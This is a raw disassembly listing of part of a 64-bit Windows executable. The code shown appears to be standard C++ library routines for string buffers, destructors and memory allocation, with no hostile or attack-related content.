   1400072ae:	4d 3b c8             	cmp    %r8,%r9
   1400072b1:	77 73                	ja     0x140007326
   1400072b3:	4d 85 c9             	test   %r9,%r9
   1400072b6:	74 16                	je     0x1400072ce
   1400072b8:	40 f6 c7 01          	test   $0x1,%dil
   1400072bc:	74 05                	je     0x1400072c3
   1400072be:	48 85 c9             	test   %rcx,%rcx
   1400072c1:	74 63                	je     0x140007326
   1400072c3:	40 f6 c7 02          	test   $0x2,%dil
   1400072c7:	74 05                	je     0x1400072ce
   1400072c9:	48 85 d2             	test   %rdx,%rdx
   1400072cc:	74 58                	je     0x140007326
   1400072ce:	4b 8d 34 11          	lea    (%r9,%r10,1),%rsi
   1400072d2:	40 f6 c7 01          	test   $0x1,%dil
   1400072d6:	74 18                	je     0x1400072f0
   1400072d8:	48 85 c9             	test   %rcx,%rcx
   1400072db:	74 13                	je     0x1400072f0
   1400072dd:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400072e1:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   1400072e5:	2b ce                	sub    %esi,%ecx
   1400072e7:	48 89 30             	mov    %rsi,(%rax)
   1400072ea:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400072ee:	89 08                	mov    %ecx,(%rax)
   1400072f0:	40 f6 c7 02          	test   $0x2,%dil
   1400072f4:	74 2b                	je     0x140007321
   1400072f6:	48 85 d2             	test   %rdx,%rdx
   1400072f9:	74 26                	je     0x140007321
   1400072fb:	48 8b 43 58          	mov    0x58(%rbx),%rax
   1400072ff:	4c 63 00             	movslq (%rax),%r8
   140007302:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007306:	4c 03 00             	add    (%rax),%r8
   140007309:	48 8b 43 20          	mov    0x20(%rbx),%rax
   14000730d:	44 2b c6             	sub    %esi,%r8d
   140007310:	4c 89 10             	mov    %r10,(%rax)
   140007313:	48 8b 43 40          	mov    0x40(%rbx),%rax
   140007317:	48 89 30             	mov    %rsi,(%rax)
   14000731a:	48 8b 43 58          	mov    0x58(%rbx),%rax
   14000731e:	44 89 00             	mov    %r8d,(%rax)
   140007321:	4d 89 0b             	mov    %r9,(%r11)
   140007324:	eb 07                	jmp    0x14000732d
   140007326:	49 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%r11)
   14000732d:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140007332:	33 c0                	xor    %eax,%eax
   140007334:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140007339:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   14000733e:	49 c7 43 08 00 00 00 	movq   $0x0,0x8(%r11)
   140007345:	00 
   140007346:	49 89 43 10          	mov    %rax,0x10(%r11)
   14000734a:	49 8b c3             	mov    %r11,%rax
   14000734d:	c3                   	ret
   14000734e:	cc                   	int3
   14000734f:	cc                   	int3
   140007350:	4c 8b 51 38          	mov    0x38(%rcx),%r10
   140007354:	49 8b 12             	mov    (%r10),%rdx
   140007357:	48 85 d2             	test   %rdx,%rdx
   14000735a:	74 4a                	je     0x1400073a6
   14000735c:	4c 8b 49 50          	mov    0x50(%rcx),%r9
   140007360:	49 63 01             	movslq (%r9),%rax
   140007363:	48 03 c2             	add    %rdx,%rax
   140007366:	48 3b d0             	cmp    %rax,%rdx
   140007369:	73 04                	jae    0x14000736f
   14000736b:	0f b6 02             	movzbl (%rdx),%eax
   14000736e:	c3                   	ret
   14000736f:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140007373:	4c 8b 00             	mov    (%rax),%r8
   140007376:	4d 85 c0             	test   %r8,%r8
   140007379:	74 2b                	je     0x1400073a6
   14000737b:	f6 41 70 04          	testb  $0x4,0x70(%rcx)
   14000737f:	75 25                	jne    0x1400073a6
   140007381:	48 8b 41 68          	mov    0x68(%rcx),%rax
   140007385:	49 3b c0             	cmp    %r8,%rax
   140007388:	49 0f 42 c0          	cmovb  %r8,%rax
   14000738c:	48 3b c2             	cmp    %rdx,%rax
   14000738f:	76 15                	jbe    0x1400073a6
   140007391:	48 89 41 68          	mov    %rax,0x68(%rcx)
   140007395:	41 2b 02             	sub    (%r10),%eax
   140007398:	41 89 01             	mov    %eax,(%r9)
   14000739b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000739f:	48 8b 08             	mov    (%rax),%rcx
   1400073a2:	0f b6 01             	movzbl (%rcx),%eax
   1400073a5:	c3                   	ret
   1400073a6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400073ab:	c3                   	ret
   1400073ac:	cc                   	int3
   1400073ad:	cc                   	int3
   1400073ae:	cc                   	int3
   1400073af:	cc                   	int3
   1400073b0:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400073b4:	4c 8b 00             	mov    (%rax),%r8
   1400073b7:	4d 85 c0             	test   %r8,%r8
   1400073ba:	74 40                	je     0x1400073fc
   1400073bc:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400073c0:	4c 3b 00             	cmp    (%rax),%r8
   1400073c3:	76 37                	jbe    0x1400073fc
   1400073c5:	83 fa ff             	cmp    $0xffffffff,%edx
   1400073c8:	74 0c                	je     0x1400073d6
   1400073ca:	41 3a 50 ff          	cmp    -0x1(%r8),%dl
   1400073ce:	74 06                	je     0x1400073d6
   1400073d0:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   1400073d4:	75 26                	jne    0x1400073fc
   1400073d6:	48 8b 41 50          	mov    0x50(%rcx),%rax
   1400073da:	ff 00                	incl   (%rax)
   1400073dc:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400073e0:	48 ff 08             	decq   (%rax)
   1400073e3:	83 fa ff             	cmp    $0xffffffff,%edx
   1400073e6:	74 09                	je     0x1400073f1
   1400073e8:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400073ec:	48 8b 08             	mov    (%rax),%rcx
   1400073ef:	88 11                	mov    %dl,(%rcx)
   1400073f1:	33 c0                	xor    %eax,%eax
   1400073f3:	83 fa ff             	cmp    $0xffffffff,%edx
   1400073f6:	0f 44 d0             	cmove  %eax,%edx
   1400073f9:	8b c2                	mov    %edx,%eax
   1400073fb:	c3                   	ret
   1400073fc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140007401:	c3                   	ret
   140007402:	cc                   	int3
   140007403:	cc                   	int3
   140007404:	cc                   	int3
   140007405:	cc                   	int3
   140007406:	cc                   	int3
   140007407:	cc                   	int3
   140007408:	cc                   	int3
   140007409:	cc                   	int3
   14000740a:	cc                   	int3
   14000740b:	cc                   	int3
   14000740c:	cc                   	int3
   14000740d:	cc                   	int3
   14000740e:	cc                   	int3
   14000740f:	cc                   	int3
   140007410:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007415:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000741a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000741f:	57                   	push   %rdi
   140007420:	41 56                	push   %r14
   140007422:	41 57                	push   %r15
   140007424:	48 83 ec 30          	sub    $0x30,%rsp
   140007428:	f6 41 70 02          	testb  $0x2,0x70(%rcx)
   14000742c:	44 8b fa             	mov    %edx,%r15d
   14000742f:	48 8b d9             	mov    %rcx,%rbx
   140007432:	0f 85 c2 01 00 00    	jne    0x1400075fa
   140007438:	83 fa ff             	cmp    $0xffffffff,%edx
   14000743b:	75 07                	jne    0x140007444
   14000743d:	33 c0                	xor    %eax,%eax
   14000743f:	e9 bb 01 00 00       	jmp    0x1400075ff
   140007444:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140007448:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   14000744c:	4c 8b 00             	mov    (%rax),%r8
   14000744f:	48 63 01             	movslq (%rcx),%rax
   140007452:	49 8d 34 00          	lea    (%r8,%rax,1),%rsi
   140007456:	4d 85 c0             	test   %r8,%r8
   140007459:	0f 84 98 00 00 00    	je     0x1400074f7
   14000745f:	4c 3b c6             	cmp    %rsi,%r8
   140007462:	73 25                	jae    0x140007489
   140007464:	ff c8                	dec    %eax
   140007466:	89 01                	mov    %eax,(%rcx)
   140007468:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000746c:	48 8b 11             	mov    (%rcx),%rdx
   14000746f:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140007473:	48 89 01             	mov    %rax,(%rcx)
   140007476:	49 8d 40 01          	lea    0x1(%r8),%rax
   14000747a:	44 88 3a             	mov    %r15b,(%rdx)
   14000747d:	48 89 43 68          	mov    %rax,0x68(%rbx)
   140007481:	41 8b c7             	mov    %r15d,%eax
   140007484:	e9 76 01 00 00       	jmp    0x1400075ff
   140007489:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000748d:	48 8b 38             	mov    (%rax),%rdi
   140007490:	48 2b f7             	sub    %rdi,%rsi
   140007493:	48 83 fe 20          	cmp    $0x20,%rsi
   140007497:	72 67                	jb     0x140007500
   140007499:	48 81 fe ff ff ff 3f 	cmp    $0x3fffffff,%rsi
   1400074a0:	73 26                	jae    0x1400074c8
   1400074a2:	48 8d 2c 36          	lea    (%rsi,%rsi,1),%rbp
   1400074a6:	48 85 ed             	test   %rbp,%rbp
   1400074a9:	75 05                	jne    0x1400074b0
   1400074ab:	45 33 f6             	xor    %r14d,%r14d
   1400074ae:	eb 60                	jmp    0x140007510
   1400074b0:	48 81 fd 00 10 00 00 	cmp    $0x1000,%rbp
   1400074b7:	72 4c                	jb     0x140007505
   1400074b9:	48 8d 4d 27          	lea    0x27(%rbp),%rcx
   1400074bd:	48 3b cd             	cmp    %rbp,%rcx
   1400074c0:	0f 86 52 01 00 00    	jbe    0x140007618
   1400074c6:	eb 13                	jmp    0x1400074db
   1400074c8:	bd ff ff ff 7f       	mov    $0x7fffffff,%ebp
   1400074cd:	48 3b f5             	cmp    %rbp,%rsi
   1400074d0:	0f 83 24 01 00 00    	jae    0x1400075fa
   1400074d6:	b9 26 00 00 80       	mov    $0x80000026,%ecx
   1400074db:	e8 a0 10 00 00       	call   0x140008580
   1400074e0:	48 85 c0             	test   %rax,%rax
   1400074e3:	0f 84 f7 00 00 00    	je     0x1400075e0
   1400074e9:	4c 8d 70 27          	lea    0x27(%rax),%r14
   1400074ed:	49 83 e6 e0          	and    $0xffffffffffffffe0,%r14
   1400074f1:	49 89 46 f8          	mov    %rax,-0x8(%r14)
   1400074f5:	eb 19                	jmp    0x140007510
   1400074f7:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400074fb:	33 f6                	xor    %esi,%esi
   1400074fd:	48 8b 38             	mov    (%rax),%rdi
   140007500:	bd 20 00 00 00       	mov    $0x20,%ebp
   140007505:	48 8b cd             	mov    %rbp,%rcx
   140007508:	e8 73 10 00 00       	call   0x140008580
   14000750d:	4c 8b f0             	mov    %rax,%r14
   140007510:	4c 8b c6             	mov    %rsi,%r8
   140007513:	48 8b d7             	mov    %rdi,%rdx
   140007516:	49 8b ce             	mov    %r14,%rcx
   140007519:	e8 cd 1f 00 00       	call   0x1400094eb
   14000751e:	49 8d 14 36          	lea    (%r14,%rsi,1),%rdx
   140007522:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140007526:	48 89 4b 68          	mov    %rcx,0x68(%rbx)
   14000752a:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000752e:	4c 89 31             	mov    %r14,(%rcx)
   140007531:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140007535:	48 89 11             	mov    %rdx,(%rcx)
   140007538:	41 8b ce             	mov    %r14d,%ecx
   14000753b:	48 8b 43 58          	mov    0x58(%rbx),%rax
   14000753f:	2b ca                	sub    %edx,%ecx
   140007541:	03 cd                	add    %ebp,%ecx
   140007543:	89 08                	mov    %ecx,(%rax)
   140007545:	f6 43 70 04          	testb  $0x4,0x70(%rbx)
   140007549:	74 1a                	je     0x140007565
   14000754b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000754f:	4c 89 30             	mov    %r14,(%rax)
   140007552:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007556:	4c 89 30             	mov    %r14,(%rax)
   140007559:	48 8b 43 50          	mov    0x50(%rbx),%rax
   14000755d:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140007563:	eb 29                	jmp    0x14000758e
   140007565:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007569:	4c 8b 43 68          	mov    0x68(%rbx),%r8
   14000756d:	48 8b 10             	mov    (%rax),%rdx
   140007570:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140007574:	48 2b d7             	sub    %rdi,%rdx
   140007577:	49 03 d6             	add    %r14,%rdx
   14000757a:	44 2b c2             	sub    %edx,%r8d
   14000757d:	4c 89 30             	mov    %r14,(%rax)
   140007580:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007584:	48 89 10             	mov    %rdx,(%rax)
   140007587:	48 8b 43 50          	mov    0x50(%rbx),%rax
   14000758b:	44 89 00             	mov    %r8d,(%rax)
   14000758e:	f6 43 70 01          	testb  $0x1,0x70(%rbx)
   140007592:	74 2c                	je     0x1400075c0
   140007594:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   14000759b:	72 18                	jb     0x1400075b5
   14000759d:	48 8b 47 f8          	mov    -0x8(%rdi),%rax
   1400075a1:	48 83 c6 27          	add    $0x27,%rsi
   1400075a5:	48 2b f8             	sub    %rax,%rdi
   1400075a8:	48 83 ef 08          	sub    $0x8,%rdi
   1400075ac:	48 83 ff 1f          	cmp    $0x1f,%rdi
   1400075b0:	77 2e                	ja     0x1400075e0
   1400075b2:	48 8b f8             	mov    %rax,%rdi
   1400075b5:	48 8b d6             	mov    %rsi,%rdx
   1400075b8:	48 8b cf             	mov    %rdi,%rcx
   1400075bb:	e8 3c 12 00 00       	call   0x1400087fc
   1400075c0:	48 8b 43 58          	mov    0x58(%rbx),%rax
   1400075c4:	83 4b 70 01          	orl    $0x1,0x70(%rbx)
   1400075c8:	ff 08                	decl   (%rax)
   1400075ca:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   1400075ce:	48 8b 11             	mov    (%rcx),%rdx
   1400075d1:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400075d5:	48 89 01             	mov    %rax,(%rcx)
   1400075d8:	41 8b c7             	mov    %r15d,%eax
   1400075db:	44 88 3a             	mov    %r15b,(%rdx)
   1400075de:	eb 1f                	jmp    0x1400075ff
   1400075e0:	45 33 c9             	xor    %r9d,%r9d
   1400075e3:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400075ea:	00 00 
   1400075ec:	45 33 c0             	xor    %r8d,%r8d
   1400075ef:	33 d2                	xor    %edx,%edx
   1400075f1:	33 c9                	xor    %ecx,%ecx
   1400075f3:	ff 15 1f 3d 00 00    	call   *0x3d1f(%rip)        # 0x14000b318
   1400075f9:	cc                   	int3
   1400075fa:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400075ff:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140007604:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140007609:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000760e:	48 83 c4 30          	add    $0x30,%rsp
   140007612:	41 5f                	pop    %r15
   140007614:	41 5e                	pop    %r14
   140007616:	5f                   	pop    %rdi
   140007617:	c3                   	ret
   140007618:	e8 03 9e ff ff       	call   0x140001420
   14000761d:	cc                   	int3
   14000761e:	cc                   	int3
   14000761f:	cc                   	int3
   140007620:	40 53                	rex push %rbx
   140007622:	48 83 ec 30          	sub    $0x30,%rsp
   140007626:	f6 41 70 01          	testb  $0x1,0x70(%rcx)
   14000762a:	48 8d 05 0f 74 00 00 	lea    0x740f(%rip),%rax        # 0x14000ea40
   140007631:	48 89 01             	mov    %rax,(%rcx)
   140007634:	48 8b d9             	mov    %rcx,%rbx
   140007637:	74 56                	je     0x14000768f
   140007639:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000763d:	48 8b 08             	mov    (%rax),%rcx
   140007640:	48 85 c9             	test   %rcx,%rcx
   140007643:	74 0c                	je     0x140007651
   140007645:	48 8b 43 58          	mov    0x58(%rbx),%rax
   140007649:	48 63 10             	movslq (%rax),%rdx
   14000764c:	48 03 d1             	add    %rcx,%rdx
   14000764f:	eb 0e                	jmp    0x14000765f
   140007651:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140007655:	48 63 10             	movslq (%rax),%rdx
   140007658:	48 8b 43 38          	mov    0x38(%rbx),%rax
   14000765c:	48 03 10             	add    (%rax),%rdx
   14000765f:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140007663:	48 8b 08             	mov    (%rax),%rcx
   140007666:	48 2b d1             	sub    %rcx,%rdx
   140007669:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140007670:	72 18                	jb     0x14000768a
   140007672:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140007676:	48 83 c2 27          	add    $0x27,%rdx
   14000767a:	48 2b c8             	sub    %rax,%rcx
   14000767d:	48 83 e9 08          	sub    $0x8,%rcx
   140007681:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140007685:	77 49                	ja     0x1400076d0
   140007687:	48 8b c8             	mov    %rax,%rcx
   14000768a:	e8 6d 11 00 00       	call   0x1400087fc
   14000768f:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140007693:	33 c9                	xor    %ecx,%ecx
   140007695:	48 89 08             	mov    %rcx,(%rax)
   140007698:	48 8b 43 38          	mov    0x38(%rbx),%rax
   14000769c:	48 89 08             	mov    %rcx,(%rax)
   14000769f:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400076a3:	89 08                	mov    %ecx,(%rax)
   1400076a5:	48 8b 43 20          	mov    0x20(%rbx),%rax
   1400076a9:	48 89 08             	mov    %rcx,(%rax)
   1400076ac:	48 8b 43 40          	mov    0x40(%rbx),%rax
   1400076b0:	48 89 08             	mov    %rcx,(%rax)
   1400076b3:	48 8b 43 58          	mov    0x58(%rbx),%rax
   1400076b7:	89 08                	mov    %ecx,(%rax)
   1400076b9:	83 63 70 fe          	andl   $0xfffffffe,0x70(%rbx)
   1400076bd:	48 89 4b 68          	mov    %rcx,0x68(%rbx)
   1400076c1:	48 8b cb             	mov    %rbx,%rcx
   1400076c4:	48 83 c4 30          	add    $0x30,%rsp
   1400076c8:	5b                   	pop    %rbx
   1400076c9:	48 ff 25 38 3a 00 00 	rex.W jmp *0x3a38(%rip)        # 0x14000b108
   1400076d0:	33 c9                	xor    %ecx,%ecx
   1400076d2:	45 33 c9             	xor    %r9d,%r9d
   1400076d5:	45 33 c0             	xor    %r8d,%r8d
   1400076d8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400076dd:	33 d2                	xor    %edx,%edx
   1400076df:	ff 15 33 3c 00 00    	call   *0x3c33(%rip)        # 0x14000b318
   1400076e5:	cc                   	int3
   1400076e6:	cc                   	int3
   1400076e7:	cc                   	int3
   1400076e8:	cc                   	int3
   1400076e9:	cc                   	int3
   1400076ea:	cc                   	int3
   1400076eb:	cc                   	int3
   1400076ec:	cc                   	int3
   1400076ed:	cc                   	int3
   1400076ee:	cc                   	int3
   1400076ef:	cc                   	int3
   1400076f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400076f5:	57                   	push   %rdi
   1400076f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400076fa:	48 8d b9 58 ff ff ff 	lea    -0xa8(%rcx),%rdi
   140007701:	8b da                	mov    %edx,%ebx
   140007703:	48 8b cf             	mov    %rdi,%rcx
   140007706:	e8 55 d8 ff ff       	call   0x140004f60
   14000770b:	f6 c3 01             	test   $0x1,%bl
   14000770e:	74 0d                	je     0x14000771d
   140007710:	ba 08 01 00 00       	mov    $0x108,%edx
   140007715:	48 8b cf             	mov    %rdi,%rcx
   140007718:	e8 df 10 00 00       	call   0x1400087fc
   14000771d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007722:	48 8b c7             	mov    %rdi,%rax
   140007725:	48 83 c4 20          	add    $0x20,%rsp
   140007729:	5f                   	pop    %rdi
   14000772a:	c3                   	ret
   14000772b:	cc                   	int3
   14000772c:	cc                   	int3
   14000772d:	cc                   	int3
   14000772e:	cc                   	int3
   14000772f:	cc                   	int3
   140007730:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007735:	57                   	push   %rdi
   140007736:	48 83 ec 20          	sub    $0x20,%rsp
   14000773a:	8b fa                	mov    %edx,%edi
   14000773c:	48 8b d9             	mov    %rcx,%rbx
   14000773f:	48 8d 05 4a 72 00 00 	lea    0x724a(%rip),%rax        # 0x14000e990
   140007746:	48 89 01             	mov    %rax,(%rcx)
   140007749:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140007750:	00 
   140007751:	74 2d                	je     0x140007780
   140007753:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   140007757:	48 8d 41 70          	lea    0x70(%rcx),%rax
   14000775b:	49 39 00             	cmp    %rax,(%r8)
   14000775e:	75 20                	jne    0x140007780
   140007760:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   140007767:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   14000776e:	49 89 08             	mov    %rcx,(%r8)
   140007771:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140007775:	48 89 08             	mov    %rcx,(%rax)
   140007778:	2b d1                	sub    %ecx,%edx
   14000777a:	48 8b 43 50          	mov    0x50(%rbx),%rax
   14000777e:	89 10                	mov    %edx,(%rax)
   140007780:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140007784:	74 08                	je     0x14000778e
   140007786:	48 8b cb             	mov    %rbx,%rcx
   140007789:	e8 b2 06 00 00       	call   0x140007e40
   14000778e:	48 8b cb             	mov    %rbx,%rcx
   140007791:	ff 15 71 39 00 00    	call   *0x3971(%rip)        # 0x14000b108
   140007797:	90                   	nop
   140007798:	40 f6 c7 01          	test   $0x1,%dil
   14000779c:	74 0d                	je     0x1400077ab
   14000779e:	ba 98 00 00 00       	mov    $0x98,%edx
   1400077a3:	48 8b cb             	mov    %rbx,%rcx
   1400077a6:	e8 51 10 00 00       	call   0x1400087fc
   1400077ab:	48 8b c3             	mov    %rbx,%rax
   1400077ae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400077b3:	48 83 c4 20          	add    $0x20,%rsp
   1400077b7:	5f                   	pop    %rdi
   1400077b8:	c3                   	ret
   1400077b9:	cc                   	int3
   1400077ba:	cc                   	int3
   1400077bb:	cc                   	int3
   1400077bc:	cc                   	int3
   1400077bd:	cc                   	int3
   1400077be:	cc                   	int3
   1400077bf:	cc                   	int3
   1400077c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400077c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400077ca:	57                   	push   %rdi
   1400077cb:	48 83 ec 20          	sub    $0x20,%rsp
   1400077cf:	48 8d b1 78 ff ff ff 	lea    -0x88(%rcx),%rsi
   1400077d6:	48 8b d9             	mov    %rcx,%rbx
   1400077d9:	48 8b 06             	mov    (%rsi),%rax
   1400077dc:	8b fa                	mov    %edx,%edi
   1400077de:	4c 63 40 04          	movslq 0x4(%rax),%r8
   1400077e2:	48 8d 05 97 71 00 00 	lea    0x7197(%rip),%rax        # 0x14000e980
   1400077e9:	49 89 84 08 78 ff ff 	mov    %rax,-0x88(%r8,%rcx,1)
   1400077f0:	ff 
   1400077f1:	48 8b 06             	mov    (%rsi),%rax
   1400077f4:	4c 63 40 04          	movslq 0x4(%rax),%r8
   1400077f8:	45 8d 88 78 ff ff ff 	lea    -0x88(%r8),%r9d
   1400077ff:	45 89 8c 08 74 ff ff 	mov    %r9d,-0x8c(%r8,%rcx,1)
   140007806:	ff 
   140007807:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
   14000780b:	e8 10 fe ff ff       	call   0x140007620
   140007810:	48 8d 4b 88          	lea    -0x78(%rbx),%rcx
   140007814:	ff 15 3e 39 00 00    	call   *0x393e(%rip)        # 0x14000b158
   14000781a:	48 8b cb             	mov    %rbx,%rcx
   14000781d:	ff 15 dd 38 00 00    	call   *0x38dd(%rip)        # 0x14000b100
   140007823:	40 f6 c7 01          	test   $0x1,%dil
   140007827:	74 0d                	je     0x140007836
   140007829:	ba e8 00 00 00       	mov    $0xe8,%edx
   14000782e:	48 8b ce             	mov    %rsi,%rcx
   140007831:	e8 c6 0f 00 00       	call   0x1400087fc
   140007836:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000783b:	48 8b c6             	mov    %rsi,%rax
   14000783e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007843:	48 83 c4 20          	add    $0x20,%rsp
   140007847:	5f                   	pop    %rdi
   140007848:	c3                   	ret
   140007849:	cc                   	int3
   14000784a:	cc                   	int3
   14000784b:	cc                   	int3
   14000784c:	cc                   	int3
   14000784d:	cc                   	int3
   14000784e:	cc                   	int3
   14000784f:	cc                   	int3
   140007850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007855:	57                   	push   %rdi
   140007856:	48 83 ec 20          	sub    $0x20,%rsp
   14000785a:	8b da                	mov    %edx,%ebx
   14000785c:	48 8b f9             	mov    %rcx,%rdi
   14000785f:	e8 bc fd ff ff       	call   0x140007620
   140007864:	f6 c3 01             	test   $0x1,%bl
   140007867:	74 0d                	je     0x140007876
   140007869:	ba 78 00 00 00       	mov    $0x78,%edx
   14000786e:	48 8b cf             	mov    %rdi,%rcx
   140007871:	e8 86 0f 00 00       	call   0x1400087fc
   140007876:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000787b:	48 8b c7             	mov    %rdi,%rax
   14000787e:	48 83 c4 20          	add    $0x20,%rsp
   140007882:	5f                   	pop    %rdi
   140007883:	c3                   	ret
   140007884:	cc                   	int3
   140007885:	cc                   	int3
   140007886:	cc                   	int3
   140007887:	cc                   	int3
   140007888:	cc                   	int3
   140007889:	cc                   	int3
   14000788a:	cc                   	int3
   14000788b:	cc                   	int3
   14000788c:	cc                   	int3
   14000788d:	cc                   	int3
   14000788e:	cc                   	int3
   14000788f:	cc                   	int3
   140007890:	40 55                	rex push %rbp
   140007892:	56                   	push   %rsi
   140007893:	57                   	push   %rdi
   140007894:	41 56                	push   %r14
   140007896:	48 83 ec 38          	sub    $0x38,%rsp
   14000789a:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   1400078a1:	ff ff 7f 
   1400078a4:	49 8b f8             	mov    %r8,%rdi
   1400078a7:	4c 8b f2             	mov    %rdx,%r14
   1400078aa:	48 8b f1             	mov    %rcx,%rsi
   1400078ad:	4c 3b c5             	cmp    %rbp,%r8
   1400078b0:	0f 87 db 00 00 00    	ja     0x140007991
   1400078b6:	49 83 f8 0f          	cmp    $0xf,%r8
   1400078ba:	77 1f                	ja     0x1400078db
   1400078bc:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   1400078c0:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   1400078c7:	00 
   1400078c8:	e8 1e 1c 00 00       	call   0x1400094eb
   1400078cd:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   1400078d1:	48 83 c4 38          	add    $0x38,%rsp
   1400078d5:	41 5e                	pop    %r14
   1400078d7:	5f                   	pop    %rdi
   1400078d8:	5e                   	pop    %rsi
   1400078d9:	5d                   	pop    %rbp
   1400078da:	c3                   	ret
   1400078db:	48 8b c7             	mov    %rdi,%rax
   1400078de:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400078e3:	48 83 c8 0f          	or     $0xf,%rax
   1400078e7:	48 3b c5             	cmp    %rbp,%rax
   1400078ea:	76 33                	jbe    0x14000791f
   1400078ec:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1400078f3:	00 00 80 
   1400078f6:	48 83 c0 27          	add    $0x27,%rax
   1400078fa:	48 8b c8             	mov    %rax,%rcx
   1400078fd:	e8 7e 0c 00 00       	call   0x140008580
   140007902:	48 85 c0             	test   %rax,%rax
   140007905:	75 48                	jne    0x14000794f
   140007907:	33 db                	xor    %ebx,%ebx
   140007909:	45 33 c9             	xor    %r9d,%r9d
   14000790c:	45 33 c0             	xor    %r8d,%r8d
   14000790f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007914:	33 d2                	xor    %edx,%edx
   140007916:	33 c9                	xor    %ecx,%ecx
   140007918:	ff 15 fa 39 00 00    	call   *0x39fa(%rip)        # 0x14000b318
   14000791e:	cc                   	int3
   14000791f:	b9 16 00 00 00       	mov    $0x16,%ecx
   140007924:	48 8b e8             	mov    %rax,%rbp
   140007927:	48 3b c1             	cmp    %rcx,%rax
   14000792a:	48 0f 42 e9          	cmovb  %rcx,%rbp
   14000792e:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140007932:	48 85 c9             	test   %rcx,%rcx
   140007935:	75 04                	jne    0x14000793b
   140007937:	33 db                	xor    %ebx,%ebx
   140007939:	eb 2a                	jmp    0x140007965
   14000793b:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140007942:	72 19                	jb     0x14000795d
   140007944:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140007948:	48 3b c1             	cmp    %rcx,%rax
   14000794b:	76 4a                	jbe    0x140007997
   14000794d:	eb ab                	jmp    0x1400078fa
   14000794f:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140007953:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140007957:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   14000795b:	eb 08                	jmp    0x140007965
   14000795d:	e8 1e 0c 00 00       	call   0x140008580
